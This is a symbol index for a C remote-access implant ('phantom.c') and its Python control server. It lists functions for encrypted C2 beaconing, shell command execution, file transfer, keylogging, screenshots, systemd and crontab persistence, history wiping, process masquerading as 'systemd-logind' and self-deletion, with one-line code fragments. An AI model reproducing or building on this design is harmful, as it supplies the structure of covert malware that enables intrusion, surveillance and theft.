# Symbols

| Symbol | Kind | File:Line | Signature |
|--------|------|-----------|-----------|
| `BEACON_INTERVAL` | macro | `phantom.c:45` | `#define BEACON_INTERVAL` |
| `CMD_BUFFER_SIZE` | macro | `phantom.c:48` | `#define CMD_BUFFER_SIZE` |
| `DEFAULT_PORT` | macro | `phantom.c:43` | `#define DEFAULT_PORT` |
| `DEFAULT_SERVER` | macro | `phantom.c:42` | `#define DEFAULT_SERVER` |
| `ENCRYPT_KEY` | macro | `phantom.c:44` | `#define ENCRYPT_KEY` |
| `FD_SET` | function | `phantom.c:582` | `FD_SET(sock, &fds);` |
| `FD_ZERO` | function | `phantom.c:581` | `FD_ZERO(&fds);` |
| `IO_URING_QUEUE_DEPTH` | macro | `phantom.c:47` | `#define IO_URING_QUEUE_DEPTH` |
| `JITTER_PERCENT` | macro | `phantom.c:46` | `#define JITTER_PERCENT` |
| `MAX_PATH` | macro | `phantom.c:49` | `#define MAX_PATH` |
| `_GNU_SOURCE` | macro | `phantom.c:6` | `#define _GNU_SOURCE` |
| `__io_uring_enter` | function | `phantom.c:72` | `static inline int __io_uring_enter(int fd, unsigned int to_submit, unsigned int min_complete,
   ...` |
| `__io_uring_register` | function | `phantom.c:76` | `static inline int __io_uring_register(int fd, unsigned int opcode, const void *arg, unsigned int ...` |
| `__io_uring_setup` | function | `phantom.c:68` | `static inline int __io_uring_setup(unsigned int entries, struct io_uring_params *p)` |
| `anti_forensics` | function | `phantom.c:600` | `static void anti_forensics(void)` |
| `c2_command_t` | struct | `phantom.c:171` | `` |
| `c2_loop` | function | `phantom.c:563` | `static void *c2_loop(void *arg)` |
| `c2_response_t` | struct | `phantom.c:177` | `` |
| `chacha20_keystream` | function | `phantom.c:154` | `static void chacha20_keystream(uint32_t counter, uint8_t *key, uint8_t *nonce, uint8_t *out, size...` |
| `close` | function | `phantom.c:278` | `close(pipefd[0]);` |
| `closedir` | function | `phantom.c:366` | `closedir(d);` |
| `connect_c2` | function | `phantom.c:409` | `static int connect_c2(void)` |
| `download_file` | function | `phantom.c:318` | `static int download_file(const char *remote_path, const char *local_path)` |
| `dup2` | function | `phantom.c:276` | `dup2(pipefd[1], STDOUT_FILENO);` |
| `encrypt_payload` | function | `phantom.c:160` | `static void encrypt_payload(uint8_t *data, size_t len, uint8_t *key, uint8_t *nonce)` |
| `execl` | function | `phantom.c:280` | `execl("/bin/sh", "sh", "-c", cmd, NULL);` |
| `exit` | function | `phantom.c:281` | `exit(1);` |
| `fchmod` | function | `phantom.c:309` | `fchmod(dst, 0644);` |
| `fclose` | function | `phantom.c:337` | `fclose(f);` |
| `fflush` | function | `phantom.c:387` | `fflush(log);` |
| `fprintf` | function | `phantom.c:336` | `fprintf(f, "[Unit]\nDescription=Phantom Service\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nUser=r` |
| `free` | function | `phantom.c:437` | `free(tmp);` |
| `inet_pton` | function | `phantom.c:416` | `inet_pton(AF_INET, g_c2_server, &addr.sin_addr);` |
| `install_persistence` | function | `phantom.c:326` | `static void install_persistence(void)` |
| `io_uring` | struct | `phantom.c:62` | `` |
| `io_uring_cq` | struct | `phantom.c:58` | `` |
| `io_uring_sq` | struct | `phantom.c:54` | `` |
| `main` | function | `phantom.c:611` | `int main(int argc, char **argv)` |
| `memcpy` | function | `phantom.c:290` | `memcpy(output + total, buf, n);` |
| `memset` | function | `phantom.c:124` | `memset(sqe, 0, sizeof(*sqe));` |
| `prctl` | function | `phantom.c:605` | `prctl(PR_SET_NAME, "systemd-logind", 0, 0, 0);` |
| `process_command` | function | `phantom.c:462` | `static void process_command(int sock, c2_command_t *cmd)` |
| `pthread_create` | function | `phantom.c:514` | `pthread_create(&g_keylog_thread, NULL, keylog_thread, NULL);` |
| `pthread_detach` | function | `phantom.c:515` | `pthread_detach(g_keylog_thread);` |
| `pthread_mutex_lock` | function | `phantom.c:204` | `pthread_mutex_lock(&g_ring_mutex);` |
| `pthread_mutex_unlock` | function | `phantom.c:217` | `pthread_mutex_unlock(&g_ring_mutex);` |
| `readlink` | function | `phantom.c:542` | `readlink("/proc/self/exe", self, sizeof(self)-1);` |
| `recv_command` | function | `phantom.c:440` | `static c2_command_t recv_command(int sock)` |
| `recv_encrypted` | function | `phantom.c:423` | `static int recv_encrypted(int sock, void *buf, size_t len, unsigned char *key)` |
| `run_shell_command` | function | `phantom.c:268` | `static char *run_shell_command(const char *cmd)` |
| `send_encrypted` | function | `phantom.c:430` | `static int send_encrypted(int sock, const void *buf, size_t len, unsigned char *key)` |
| `send_response` | function | `phantom.c:452` | `static void send_response(int sock, c2_response_t *resp)` |
| `setrlimit` | function | `phantom.c:604` | `setrlimit(RLIMIT_CORE, &rl);` |
| `sleep` | function | `phantom.c:571` | `sleep(delay);` |
| `snprintf` | function | `phantom.c:333` | `snprintf(svc_path, sizeof(svc_path), "/etc/systemd/system/phantom.service");` |
| `srand` | function | `phantom.c:156` | `srand((unsigned)(counter + time(NULL) ^ (uintptr_t)key));` |
| `strcpy` | function | `phantom.c:446` | `strcpy(cmd.cmd_type, "none");` |
| `strncpy` | function | `phantom.c:614` | `strncpy(g_c2_server, argv[++i], sizeof(g_c2_server)-1);` |
| `syscall` | function | `phantom.c:70` | `return syscall(__NR_io_uring_setup, entries, p);` |
| `system` | function | `phantom.c:343` | `system(crontab_cmd);` |
| `take_screenshot` | function | `phantom.c:400` | `static void take_screenshot(const char *outfile)` |
| `unlink` | function | `phantom.c:543` | `unlink(self);` |
| `unsetenv` | function | `phantom.c:601` | `unsetenv("HISTFILE");` |
| `upload_file` | function | `phantom.c:303` | `static int upload_file(const char *local_path, const char *remote_path)` |
| `uring_cqe_seen` | function | `phantom.c:142` | `static inline void uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe)` |
| `uring_get_sqe` | function | `phantom.c:119` | `static struct io_uring_sqe *uring_get_sqe(struct io_uring *ring)` |
| `uring_queue_init` | function | `phantom.c:79` | `static int uring_queue_init(unsigned int entries, struct io_uring *ring)` |
| `uring_read` | function | `phantom.c:220` | `static ssize_t uring_read(int fd, void *buf, size_t count, off_t offset)` |
| `uring_submit` | function | `phantom.c:127` | `static int uring_submit(struct io_uring *ring)` |
| `uring_wait_cqe_timeout` | function | `phantom.c:133` | `static int uring_wait_cqe_timeout(struct io_uring *ring, struct io_uring_cqe **cqe_ptr, int timeo...` |
| `uring_write` | function | `phantom.c:242` | `static ssize_t uring_write(int fd, const void *buf, size_t count, off_t offset)` |
| `usleep` | function | `phantom.c:390` | `usleep(10000);` |
| `waitpid` | function | `phantom.c:295` | `waitpid(pid, NULL, 0);` |
| `xor_crypt` | function | `phantom.c:427` | `xor_crypt((unsigned char*)buf, n, key, strlen((char*)key));` |
| `main` | function | `server.py:25` | `def main()` |
| `recv_exact` | function | `server.py:15` | `def recv_exact(sock, n)` |
| `xor_crypt` | function | `server.py:11` | `def xor_crypt(data)` |
